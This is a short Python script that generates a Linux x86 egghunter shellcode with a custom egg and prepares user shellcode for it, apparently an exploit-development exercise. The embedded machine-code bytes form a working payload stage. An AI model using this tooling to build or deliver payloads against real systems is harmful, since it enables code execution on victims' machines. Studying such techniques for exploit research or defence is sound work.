#!/usr/bin/python

original_hunter ="\\x31\\xdb\\x31\\xc9\\x66\\x81\\xca\\xff\\x0f\\x42" + \
                "\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2" + \
                "\\x74\\xee\\xb8\\x44\\x33\\x22\\x11\\x89\\xd7\\xaf" + \
                "\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7" 

egg = raw_input("egg value (4 bytes):")[::-1]

if len(egg)!=4:
  print "Invalid egg length"

egg = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in egg)
 
hunter_shellcode = original_hunter.replace("\\x44\\x33\\x22\\x11", egg)

shellcode = raw_input("shellcode:")

prepped_shellcode = egg+egg+shellcode


print "Hunter:\n" + hunter_shellcode


print "Shellcode:\n"+prepped_shellcode
